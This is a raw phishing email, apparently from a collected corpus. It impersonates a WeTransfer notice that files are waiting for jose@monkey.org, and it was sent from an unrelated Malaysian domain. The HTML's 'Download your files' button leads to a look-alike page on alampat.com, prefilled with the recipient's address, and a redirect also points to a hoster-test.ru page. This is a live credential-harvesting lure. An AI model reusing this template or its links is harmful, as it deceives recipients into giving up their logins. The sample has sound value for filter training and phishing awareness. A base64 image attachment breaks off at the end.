@@ -1,0 +1,387 @@
+Return-Path: wetransfer@awc.com.my
+Delivered-To: jose@monkey.org
+X-FDA: 83780513166.14.7AB153A
+Received: from mail.awc.com.my (mail.awc.com.my [103.217.93.53])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id 2F0EB100004
+	for <jose@monkey.org>; Fri, 15 Aug 2025 23:00:39 +0000 (UTC)
+Authentication-Results: imf28.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=quarantine) header.from=awc.com.my;
+	spf=pass (imf28.b.hostedemail.com: domain of wetransfer@awc.com.my designates
+ 103.217.93.53 as permitted sender) smtp.mailfrom=wetransfer@awc.com.my
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1755298841; a=rsa-sha256;
+	cv=none;
+	b=BFU2DMf1OpErhU4cG/n3pUj9+fYR+is8i9aHs/bKm3NlCKiHp+s77hVNU44SaLXDSGnPyC
+	OCEXpFf/6O793z/wP9y92WuOM+a5e6G/hHRnWSuwp7OuJy7jrwSPopCGxqBbM/fYyQBR68
+	umLZdeDFcrVoR5ESQ7byzPVHf4YZ0M0=
+ARC-Authentication-Results: i=1;
+	imf28.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=quarantine) header.from=awc.com.my;
+	spf=pass (imf28.b.hostedemail.com: domain of wetransfer@awc.com.my designates
+ 103.217.93.53 as permitted sender) smtp.mailfrom=wetransfer@awc.com.my
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1755298841;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=iDXlNdf8xw+vSEvaVpECXpuMWDLcGVIHmmEW780+f34=;
+	b=XGZUcQTq9tGCpRTAi3T0XsfqPARibABu31qhCyrC0+EZkTPzq8at+NSCHlzcFTgKtrpzxZ
+	cNWEKPdfoa/Nf67RSnQVfgRi3Epd4aBFEHHfWG2K+GP5s3ft1J8MqKSNRLNaZBk1mp/dj3
+	ntceh/sJ2I3UBJddaDmWa3uB0YV0nAM=
+Received: from awc.com.my (UnknownHost [185.38.142.121]) by mail.awc.com.my
+	with SMTP	(version=Tls12	cipher=Aes256 bits=256);
+	Fri, 15 Aug 2025 19:09:47 +0800
+From: WeTransfer <wetransfer@awc.com.my>
+To: jose@monkey.org
+Subject: You have received files via WeTransfer
+Date: 15 Aug 2025 04:09:46 -0700
+Message-ID: <20250815040946.20CBF68D72D28DB2@awc.com.my>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_DCC82FBF.89358AB3"
+X-Spam-Status: No, score=3.50
+X-Stat-Signature: iqoi1heznom1boih8sog3qbzfembn6dd
+X-Rspam-User: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: 2F0EB100004
+X-HE-Tag: 1755298839-113096
+X-HE-Meta: 
+ U2FsdGVkX1+xMQAQ1g8ycvUqpq55DvXEcm505lyA2AC03w5xgoOhPOtqAEbQneXXrSSuNNnWlnvzJ8CSLB4XY6zojcG18aaTnCqsW3xW4wNFuJ1iQmUvJfd5XPM4Y6yR0BfqABCD2sy2almOYKpC4zcI+OtRVFcpVghI5XV4pbS3wlS9NdCQY/L0W0cO35LxEGYGDPbAewbpHO3M001UB7qH95EDe/NNSuX5gipMn2i5HO+d4QIBxSJgIz6y++1c3NRjtdXxiMVMPXOsGkOhdkMYdgQMXrsPRHzvJCbIKkldaqYLhh6IbHwl/OHYJuKfUC4NdL1ztfHJlwkk1d9YPsuRxYR/cr6M6S6v8cwj92R98RaqJgjD+19590oGh2aA/sLuI9TyXJqXoV8E5fAluIfE0xwdVvMMQJU2sgTvWMUWMnzKLvSvCM458Owffa8V5N9c0pAOCZ1tiFbi8zjTPdcYJ5u18WzB+CtIrF2MHKERz9Q1XoCwhXHpzpQK1jb0g7zkDZsXBusk4ixihI2Z0DhtZXjsFB7MCDHS7FADTio7FfrI7yGxD6g0zWcLFnTkWtVYLovn4YJLVWVJ4KH92CjVVjPpbVbdmuZY4/kebUbVnGA90zKGQKVQbAP1U0Jr8n08cRmYK0pYEExFq4VHZ5taDX4fEV4xssrrER+ohl4Qoa7rvbJrJ7ZP2dBKTIY9JicKSiQ2OcDQ6MXqMb6BBS1u9XxZWsKPS/d8qj++t0Po7k+Kj1OSL4iknmPbPOfAJLtVImkUQWKkMf1d2dyF4rvCpAF56AofleAxEd/tyoaOPY6pw8C78HOqEzZfxEs30Mjy3mhAVEQtdGUpIbteo8ZoQu/GG6OtEg3C91u7E+UwXEbal+g5f1uTG7+D8KdMza9OtTv7le6c+0VbigzcgyCL3lX4cSGy61YmAqKBa7Od516RkdTEdx0MZF8XHhO8sxpBAWfKfccQIcvupQMLo3p2TcU
+ 8otBi13LyAtQ0WA0aIzz7fC6fMcG80xJgvcZfxrxvtnGFCUtpT6dLgiKQLiFTwZRr4S9D0IG0rtObpnjjVxl1R3Rdzwkee4c+Y4Xe2sJnENE47B6ALWY1xg6GxkqhTOhhAhqFmcXfNnWX6iGLVGCSvBrZ25VwXaz/hxA4gfWPZLx2k4LUv228XIcjupry3OqyUb6QjLJNr84Mu0bqmDoHDtafUhZ7o4HMc41oc2R+7OFnoYu9S54DiTU/hnTBE2f2BpIHGhVhvWKAxNeAFrQOdkVnH7ke+Ax3C8darFq6RLtOXkq39uTxRc+ffhDJT024/OBdTsi5L8iL0wwDeA7PWcXDgDD7jeYmvkA0RnuNbVVunWipwPqNyXY3FvprIc0gV33xT8KAb7P+i/NgZdN7T8G+llUUrIOXsllVhxtWmrs/J/DujfIwkDf8xhAP8oCLeEBf6AFVFZTnRd6hF7VXT0YtUtqp4zPui62pxjJ33nZ8/K5Z37B7y42cag==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 328
+
+
+------=_NextPart_000_0012_DCC82FBF.89358AB3
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV id=3Dm_4971718737960182002m_8359500063700714821m_-2050968793428494608g=
+mail-viewmail-body style=3D'FONT-SIZE: 12px; FONT-FAMILY: dotum, "Apple Got=
+hic", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: n=
+one; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2=
+; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TE=
+XT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial'>
+<DIV style=3D"BORDER-TOP: 0px; HEIGHT: 813px; BORDER-RIGHT: 0px; WIDTH: 629=
+px; BORDER-BOTTOM: 0px; CLEAR: both; BORDER-LEFT: 0px">
+<DIV style=3D"PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 10px; P=
+ADDING-LEFT: 0px; CLEAR: both; PADDING-RIGHT: 0px">
+<DIV id=3Dm_4971718737960182002m_8359500063700714821m_-2050968793428494608g=
+mail-viewmail-textHtml style=3D"PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PAD=
+DING-TOP: 10px; PADDING-LEFT: 24px; CLEAR: both; MARGIN: 0px auto; LINE-HEI=
+GHT: 1.5; PADDING-RIGHT: 0px" name=3D"viewmail-textHtml"><SPAN>
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; COLOR:=
+ rgb(51,51,51)" width=3D"100%">
+<TBODY>
+<TR>
+<td style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
+IN: 0px; PADDING-RIGHT: 0px" valign=3D"top">
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: &quot;Helvetica Neue&quot;, H=
+elvetica, Arial, sans-serif; WIDTH: 600px; WHITE-SPACE: normal; WORD-SPACIN=
+G: 0px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; TEXT-TRANSFORM: non=
+e; FONT-WEIGHT: 400; COLOR: rgb(38,40,42); OUTLINE-WIDTH: medium; PADDING-B=
+OTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; OUTLINE=
+-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
+NG-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255);=20
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; text-decoration-style: initial; text-decoration-color: initial" cellspaci=
+ng=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 600px; OUTLINE=
+-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 55px; OUTLINE-STYLE: none=
+; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" v=
+align=3D"top" align=3D"left">
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; WIDTH:=
+ 600px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(51,51,51=
+); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
+YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" cellspacing=
+=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 10px; FONT-FAMILY: arial, verdana, sans-serif; WIDT=
+H: 600px; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUT=
+LINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDI=
+NG-RIGHT: 0px" bgcolor=3D"#409fff" valign=3D"top" align=3D"left">
+<CENTER>
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; WIDTH:=
+ auto; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(51,51,51)=
+; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STY=
+LE: none; PADDING-LEFT: 0px; MARGIN: 0px auto; PADDING-RIGHT: 0px" cellspac=
+ing=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 56px; OUTLINE-=
+WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; =
+PADDING-LEFT: 0px; MIN-HEIGHT: 16px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDI=
+NG-RIGHT: 0px" height=3D"16" valign=3D"top" align=3D"left"><BR></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 56px; OUTLINE-=
+WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; =
+PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" val=
+ign=3D"top" align=3D"left">
+<A style=3D"TEXT-DECORATION: underline; COLOR: rgb(25,106,212)" href=3D"htt=
+ps://wetransfer.com/utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgene=
+ral&amp;utm_medium=3Dlogo&amp;utm_source=3Dnotify_recipient_email" rel=3D"n=
+ofollow noopener" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://wetransfer.c=
+om/utm_campaign%3DWT_email_tracking%26utm_content%3Dgeneral%26utm_medium%3D=
+logo%26utm_source%3Dnotify_recipient_email&amp;source=3Dgmail&amp;ust=3D175=
+5333289473000&amp;usg=3DAOvVaw34iSItEIGIh7entHioOUcC">
+<img style=3D"TEXT-DECORATION: none; BORDER-TOP: medium none; BORDER-RIGHT:=
+ medium none; WIDTH: 56px; BORDER-BOTTOM: medium none; OUTLINE-WIDTH: mediu=
+m; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT=
+: 0px; MIN-HEIGHT: auto; BORDER-LEFT: medium none; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" border=3D"0" alt=3D"Click 'Down=
+load images' to view images" src=3D"cid:white2x-f4cfc880393aea615941f54a0ec=
+4fc3745378c8c3e2699d852c8fced5562f10d.png" width=3D"56" align=3D"middle" he=
+ight=3D"30"></A></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 56px; OUTLINE-=
+WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; =
+PADDING-LEFT: 0px; MIN-HEIGHT: 11px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDI=
+NG-RIGHT: 0px" height=3D"11" valign=3D"top" align=3D"left"><BR></TD></TR></=
+TBODY></TABLE></CENTER></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>=
+
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: &quot;Helvetica Neue&quot;, H=
+elvetica, Arial, sans-serif; WIDTH: 600px; WHITE-SPACE: normal; WORD-SPACIN=
+G: 0px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; TEXT-TRANSFORM: non=
+e; FONT-WEIGHT: 400; COLOR: rgb(38,40,42); OUTLINE-WIDTH: medium; PADDING-B=
+OTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; OUTLINE=
+-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
+NG-RIGHT: 0px; TEXT-INDENT: 0px; font-variant-ligatures:=20
+normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
+oration-color: initial" cellspacing=3D"0" cellpadding=3D"0" bgcolor=3D"#fff=
+fff" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 600px; OUTLINE=
+-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none;=
+ PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" va=
+lign=3D"top" align=3D"left">
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; WIDTH:=
+ 600px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(51,51,51=
+); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
+YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" cellspacing=
+=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 600px; OUTLINE=
+-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none;=
+ PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" va=
+lign=3D"top" align=3D"left">
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; WIDTH:=
+ 600px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(51,51,51=
+); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
+YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" cellspacing=
+=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft YaHei UI", "Microsoft=
+ YaHei", SimSun, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(33,33,33)=
+; FONT-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255=
+,255); TEXT-INDENT: 0px; text-decoration-color: initial'>
+<td style=3D"FONT-SIZE: 26px; FONT-FAMILY: &quot;FreightSans Pro&quot;, &qu=
+ot;Segoe UI&quot;, &quot;SanFrancisco Display&quot;, Arial, sans-serif; WID=
+TH: 440px; WORD-SPACING: 0px; FONT-WEIGHT: normal; COLOR: rgb(23,24,26); OU=
+TLINE-WIDTH: medium; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: =
+60px; OUTLINE-STYLE: none; PADDING-LEFT: 80px; MARGIN: 0px; LINE-HEIGHT: 30=
+px; PADDING-RIGHT: 80px" valign=3D"top" align=3D"center"><A style=3D"TEXT-D=
+ECORATION: none; COLOR: rgb(0,51,153)"><SPAN>jose@monkey.org<BR></SPAN></A>=
+<BR>
+You have received a files via WeTransfer</TD></TR>
+<TR style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft YaHei UI", "Microsoft=
+ YaHei", SimSun, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(33,33,33)=
+; FONT-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255=
+,255); TEXT-INDENT: 0px; text-decoration-color: initial'>
+<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Fakt Pro&quot;, &quot;Sego=
+e UI&quot;, &quot;SanFrancisco Display&quot;, Arial, sans-serif; WIDTH: 440=
+px; WORD-SPACING: 0px; FONT-WEIGHT: normal; COLOR: rgb(145,149,153); OUTLIN=
+E-WIDTH: medium; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 20px=
+; OUTLINE-STYLE: none; PADDING-LEFT: 80px; MARGIN: 0px; LINE-HEIGHT: 23px; =
+PADDING-RIGHT: 80px" valign=3D"top" align=3D"center">&nbsp;P.O, 138 MB in t=
+otal Will be deleted on&nbsp;20 Aug, 2025</TD></TR>
+<TR style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft YaHei UI", "Microsoft=
+ YaHei", SimSun, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(33,33,33)=
+; FONT-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255=
+,255); TEXT-INDENT: 0px; text-decoration-color: initial'>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 280px; OUTLINE=
+-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 40px; OUTLINE-STYLE: none=
+; PADDING-LEFT: 160px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 160p=
+x" valign=3D"top" align=3D"left">
+<table style=3D"FONT-SIZE: 12px; FONT-FAMILY: ??, dotum, sans-serif; WIDTH:=
+ 280px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; COLOR: rgb(51,51,51=
+); OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-ST=
+YLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" cellspacing=
+=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 280px; OUTLINE=
+-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none;=
+ PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" va=
+lign=3D"top" align=3D"left">
+<A style=3D'FONT-SIZE: 14px; TEXT-DECORATION: none; FONT-FAMILY: "Fakt Pro =
+Medium", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; BACKGROUND:=
+ rgb(64,159,255); WORD-SPACING: 0px; COLOR: rgb(255,255,255); PADDING-BOTTO=
+M: 15px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 15px; PADDING=
+-LEFT: 20px; DISPLAY: block; PADDING-RIGHT: 20px; border-radius: 25px' href=
+=3D"https://alampat.com/wetransfer_reviewfile.html?e=3Djose@monkey.org" rel=
+=3D"nofollow noopener" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://srv229334.hos=
+ter-test.ru/wetransfer_reviewfile.html?e%3D%5B%5B-Email-%5D%5D&amp;source=
+=3Dgmail&amp;ust=3D1755333289473000&amp;usg=3DAOvVaw07ji4V4EWB6wVjSnunakGf"=
+>
+<UL>
+<LI><SPAN style=3D'FONT-FAMILY: "Fakt Pro Medium", "Segoe UI", "SanFrancisc=
+o Display", Arial, sans-serif, serif, EmojiFont'>Download your files</SPAN>=
+</LI></UL></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR=
+></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Aria=
+l, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(38,40,42); PADDING-BOTTOM: 0px; FONT-STYLE: =
+normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; text-decoration-style: initial;=20
+text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: Helvetica, "Microsoft Yahei", ver=
+dana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
+IGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: normal; PADDI=
+NG-RIGHT: 0px; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-varia=
+nt-caps: normal; text-decoration-style: initial; text-decoration-color: ini=
+tial'><BR></P></TD></TR></TBODY></TABLE><BR>
+<DIV>&#8251; If you cannot see the contents of the letter clearly, click &#=
+8220;Download Mail&#8221;&nbsp;</DIV>
+<DIV>to download the original text of the mail.<BR></DIV></SPAN></DIV>
+<DIV style=3D"WIDTH: 1142px; MARGIN: 7px 0px 42px"><A style=3D"TEXT-DECORAT=
+ION: none" name=3Dm_4971718737960182002_m_8359500063700714821_m_-2050968793=
+428494608_fileAttachView></A></DIV></DIV></DIV></DIV>
+<img style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; HEIGHT: 1px; FONT-FAMILY: d=
+otum, &quot;Apple Gothic&quot;, sans-serif; BORDER-RIGHT: 0px; WIDTH: 1px; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM:=
+ none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; BORDER-L=
+EFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial" src=3D"cid:blank.gif" width=3D"1" height=3D"1"></B=
+ODY></HTML>
+------=_NextPart_000_0012_DCC82FBF.89358AB3
+Content-Type: image/png;
+	name*0=white2x-f4cfc880393aea615941f54a0ec4fc3745378c8c3e2699d852c8fced5562;
+	name*1=f10d.png
+Content-Transfer-Encoding: base64
+Content-ID: 
+ <white2x-f4cfc880393aea615941f54a0ec4fc3745378c8c3e2699d852c8fced5562f10d.png>
+
+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
